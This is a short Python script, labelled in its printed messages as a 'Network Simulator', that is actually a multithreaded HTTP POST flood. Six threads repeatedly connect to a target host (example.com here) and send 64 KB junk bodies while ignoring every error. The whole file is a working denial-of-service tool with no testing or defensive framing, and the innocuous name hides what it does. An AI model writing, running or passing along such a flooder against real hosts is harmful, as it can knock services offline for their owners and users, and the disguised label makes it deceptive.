import socket
import threading
import time

TARGET = ("example.com", 80)
THREADS = 6
PAYLOAD_SIZE = 64_000

payload = b"A" * PAYLOAD_SIZE
RUNNING = True

def flood():
    while RUNNING:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect(TARGET)
            s.sendall(
                b"POST / HTTP/1.1\r\n"
                b"Host: example.com\r\n"
                b"Content-Length: " + str(len(payload)).encode() + b"\r\n\r\n"
                + payload
            )
            s.close()
        except:
            pass

print("Network Simulator Running")
print("Press CTRL+C to stop")

threads = []
for _ in range(THREADS):
    t = threading.Thread(target=flood, daemon=True)
    t.start()
    threads.append(t)

try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    RUNNING = False
    print("\nNetwork simulator stopped")

